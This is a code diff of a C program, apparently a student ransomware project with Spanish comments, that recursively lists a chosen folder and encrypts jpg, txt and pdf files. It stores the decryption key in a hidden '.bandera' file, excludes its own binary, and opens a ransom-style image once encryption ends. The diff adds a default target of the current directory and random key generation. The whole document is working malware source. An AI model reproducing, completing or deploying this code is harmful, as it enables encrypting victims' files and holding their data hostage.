@@ -4,9 +4,9 @@
 #include<time.h>
 
 //Prototipos de funciones
-void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, FILE *archivo, ssize_t tamanio, int *dos_despues, int a,int b,int c);
+void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a,int b,int c, char *nombre_ransomware);
 
-int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, FILE *archivo, int a, int b,int c);
+int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, int a, int b,int c, char *nombre_ransomware);
 
 char * agregar_barra(char *sin_barra);
 
@@ -17,83 +17,84 @@ void cifrar(char *direccion_archivo, int a, int b, int c);
 
 int main(int argc, char *argv[]){
 
-
 	//Variables para leer salida de comandos y archivos
+	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[3],*nombre_ransomware=argv[0],*carpeta=NULL,*tmp=NULL;
 
-	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[3];
 	//Comando para obtener directorios
-	
-	char comando1[]="ls -lRa 2>/dev/null "; 
+	char comando1[]="ls -lRa 2>/dev/null ";
 
 	//Comando para obtener nombre de los archivod
-
 	char awk[]=" | awk '{if (NF>9) {{for(i=9; i<NF; i++) printf $i\" \"} print $i} else  print $NF}'";
-
-	size_t longitud=0,longitud2=0;														
-	ssize_t tamanio,tamanio_nombre;
+	size_t longitud=0,longitud2=0,longitud3=0;														
+	ssize_t tamanio;
 	int i=0, *dos_despues, a, b, c, arg1=0, arg2=0, arg3=0;
-
-	if(argc>2){
-		arg1=atoi(argv[2]);
-		arg2=atoi(argv[3]);
-		arg3=atoi(argv[4]);	
-	}else{
-                srand(time(NULL));
-                arg1=rand()%256;
-                arg2=rand()%256;
-                arg3=rand()%256;
-        }
+	
+	FILE *direccion_abs=popen("echo $PWD/","r");
+	getline(&tmp,&longitud3,direccion_abs);
+	carpeta=(char *)calloc(strlen(tmp)+strlen(argv[1]),sizeof(char));
+	strncpy (carpeta,tmp, strlen(tmp));
+	carpeta[strlen(tmp)-1]='\0';
+	switch(argc){
+		case 1:
+			break;
+		case 2:
+			if(!strstr(argv[1],"./")){
+				strcat(carpeta,argv[1]);
+			}
+			break;
+		case 5:
+		        arg1=atoi(argv[2]);
+        	        arg2=atoi(argv[3]);
+	                arg3=atoi(argv[4]);
+			break;
+	}
 
 	//Reserva de memoria
-
 	dos_despues=(int *)calloc(1,sizeof(int));
 	direccion_carpeta=(char**)calloc(1,sizeof(char*));
-
-	//Reservamos espacio y creamos el comando conforme al argumento que se de (Carpeta a cifrar)
 	
-	ls=(char *)calloc(strlen(comando1)+strlen(argv[1]),sizeof(char));								
-	strcpy(ls,comando1);
-	strcat(ls,argv[1]);
-	printf("%s\n",ls);
-	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));	
-	strcpy(ls_awk,ls);
+	//Reservamos espacio y creamos el comando conforme al argumento que se de (Carpeta a cifrar)
+	ls=(char *)calloc(strlen(comando1)+strlen(carpeta),sizeof(char));								
+	strncpy (ls,comando1,strlen(comando1));
+	ls[strlen(comando1)]='\0';
+	strcat(ls,carpeta);
+
+	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));
+	strncpy(ls_awk,ls,strlen(ls));
+	ls_awk[strlen(ls)]='\0';
 	strcat(ls_awk,awk);
-	printf("%s\n",ls_awk);
+	
 	//Ejecutamos los comandos	
-
-	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r"), *archivo;
-
+	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r");
 	//Liberamos el espacio de los comandos creados	
-
 	free(ls);
 	free(ls_awk);
-
 	FILE *bandera;
 
-
 	//En caso de que no exista .bandera se crea el archivo y además se procede a cifrar los archivos
-	if(bandera=fopen(".bandera","r")){
+	if((bandera=fopen(".bandera","r"))){
         	fread(boleano,1,2,bandera);
                 fclose(bandera);
         }else{
-                if(bandera=fopen(".bandera","w")){
+                if((bandera=fopen(".bandera","w"))){
                 	fprintf(bandera,"%s","no");
-			strcpy(boleano,"no");
+			strncpy(boleano,"no",strlen("no"));
+			boleano[strlen("no")]='\0';
                 	fclose(bandera);
 		}else{
 			printf("Fallo en ejecución 1");
 			exit(1);
 		}
         }
+
 	//El archivo .bandera contiene la contraseña para decifrar y además actua como bandera para saber si se va a cifrar o descifrar
-	if(!strcmp("si",boleano)){
-		
-		if(bandera=fopen(".bandera","r")){
+	if(!strcmp("si",boleano)){	
+		if((bandera=fopen(".bandera","r"))){
 			fread(boleano,1,2,bandera);	
 			fseek(bandera,1,SEEK_CUR);
 			//Obetenemos la contraseña para decifrar
-			fscanf(bandera,"%i %i %i",&a,&b,&c);
-			
+			fscanf(bandera,"%i %i %i\n",&a,&b,&c);
+			getline(&carpeta,&longitud3,bandera);
 			do{
 				if(i==0){	
 					i++;
@@ -113,32 +114,37 @@ int main(int argc, char *argv[]){
 					}
 				}
 			}while((a!=arg1) || (b!=arg2) ||  (c!=arg3));
-			
 		}else{
 			printf("Fallo de ejecución 3");
 			exit(1);
 		}
 	}else{
 		//En caso de que se vaya a cifrar se guarda la contraseña en el archivo .bandera
-		if(bandera=fopen(".bandera","w")){
+		if(argc<5){
+			printf("Se ha creado una contraseña al azar.\n");
+                        srand(time(NULL));
+                        arg1=rand()%256;
+                        arg2=rand()%256;
+                        arg3=rand()%256;
+		}	
+		if((bandera=fopen(".bandera","w"))){	
+
 			fprintf(bandera,"%s","si");
 			fprintf(bandera,"\n%i %i %i",arg1,arg2,arg3);
+			fprintf(bandera,"\n%s",carpeta);
 			fclose(bandera);
 		}else{
 			printf("Fallo en ejecución 4");
 		}
 	}
-	
 
 	//Leemos línea por linea de ambos comandos al mismo tiempo
-	
 	while((tamanio=getline(&linea_direccion, &longitud, directorios)) != -1 ){		
-		tamanio_nombre=getline(&nombre_archivo, &longitud2, directorios2);
-		nombre_direccion( linea_direccion, direccion_carpeta, direccion_archivo, nombre_archivo, archivo, tamanio, dos_despues, arg1, arg2, arg3);
+		getline(&nombre_archivo, &longitud2, directorios2);
+		nombre_direccion( linea_direccion, direccion_carpeta, direccion_archivo, nombre_archivo, tamanio, dos_despues, arg1, arg2, arg3, nombre_ransomware);
 	}
 
 	//Abrimos imagen cuando se haya cifrado
-	
 	if(!strcmp("no",boleano)){
 		//En caso de que no se pueda abrir mandamos error a null 
 		system("xdg-open ./.img2 2>/dev/null");
@@ -148,10 +154,9 @@ int main(int argc, char *argv[]){
 	return 0;
 }
 
-void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, FILE *archivo, ssize_t tamanio, int *dos_despues, int a, int b, int c){
+void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, ssize_t tamanio, int *dos_despues, int a, int b, int c,char *nombre_ransomware){
 
 	//Obtenemos los direcctorios
-	
 	if(linea_direccion[tamanio-2]==':'){
         	*dos_despues=0;
                	*direccion_carpeta=(char *)calloc(tamanio+1,sizeof(char));
@@ -162,7 +167,6 @@ void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *dir
 	}
 	
 	//Dos renglones después empieza la lista de archivo
-
         if(*dos_despues<2){
 		(*dos_despues)++;
        	}else{
@@ -172,34 +176,34 @@ void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *dir
 			
 			//Creamos la dirección adsoluta de los archivos y los abrimos
                 	if(tamanio>10){
-                                       creacion_de_archivos(direccion_archivo,*direccion_carpeta,nombre_archivo,archivo, a, b, c);
+                                       creacion_de_archivos(direccion_archivo,*direccion_carpeta,nombre_archivo, a, b, c,nombre_ransomware);
                 	}
         	}
 	}
 }
 
 
-int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, FILE *archivo, int a, int b, int c){
+int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, int a, int b, int c,char *nombre_ransomware){
 
 	char *file=NULL, *direccion_con_barra=NULL, *tipo=NULL;
-	size_t tamanio_binario=0,tamanio_file=0;
-	int i;
-	ssize_t tamanio_linea;
+	size_t tamanio_file=0;
 	FILE *tipo_archivo;
 	direccion_archivo=(char *)calloc(strlen(direccion_carpeta)+strlen(nombre_archivo),sizeof(char));
-        strcpy(direccion_archivo,direccion_carpeta);
+        strncpy(direccion_archivo,direccion_carpeta,strlen(direccion_carpeta));
+	direccion_archivo[strlen(direccion_carpeta)]='\0';
         strncat(direccion_archivo,nombre_archivo,strlen(nombre_archivo)-1);
-        if(strstr(nombre_archivo,"ransonware") || strstr(nombre_archivo,".bandera") || strstr(nombre_archivo,".img2")){
-		return 1;
+        if(strstr(nombre_archivo,nombre_ransomware) || strstr(nombre_archivo,".bandera") || strstr(nombre_archivo,".img2")){
+		return 0;
         }
        	//Condidición para archivos con extensión en pdf, txt y jpg
 	if( ((direccion_archivo[strlen(direccion_archivo)-1]=='g' || direccion_archivo[strlen(direccion_archivo)-1]=='G') && (direccion_archivo[strlen(direccion_archivo)-2]=='p' || direccion_archivo[strlen(direccion_archivo)-2]=='P') && (direccion_archivo[strlen(direccion_archivo)-3]=='j' || direccion_archivo[strlen(direccion_archivo)-3]=='J' )) || ((direccion_archivo[strlen(direccion_archivo)-1]=='t' || direccion_archivo[strlen(direccion_archivo)-1]=='T') && (direccion_archivo[strlen(direccion_archivo)-2]=='x' || direccion_archivo[strlen(direccion_archivo)-2]=='X') && (direccion_archivo[strlen(direccion_archivo)-3]=='t' || direccion_archivo[strlen(direccion_archivo)-3]=='T')) || ((direccion_archivo[strlen(direccion_archivo)-1]=='f' || direccion_archivo[strlen(direccion_archivo)-1]=='F') && (direccion_archivo[strlen(direccion_archivo)-2]=='d' ||  direccion_archivo[strlen(direccion_archivo)-2]=='D') && (direccion_archivo[strlen(direccion_archivo)-3]=='p' || direccion_archivo[strlen(direccion_archivo)-3]=='P'))){
 		cifrar(direccion_archivo,a,b,c);
 	}else{
-	
 		direccion_con_barra=agregar_barra(direccion_archivo);
+		printf("%s\n",direccion_con_barra);
 		file=(char *)calloc(strlen(direccion_con_barra)+6,sizeof(char));
-		strcpy(file,"file ");
+		strncpy(file,"file ",strlen("file "));
+		file[strlen("file ")]='\0';
 		strcat(file,direccion_con_barra);
 		tipo_archivo=popen(file,"r");
 		getline(&tipo,&tamanio_file,tipo_archivo);
@@ -209,7 +213,6 @@ int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char 
 		free(tipo);
 		fclose(tipo_archivo);	
 	}
-       	tamanio_binario=0;
         free(direccion_archivo);
 	return 0;
 
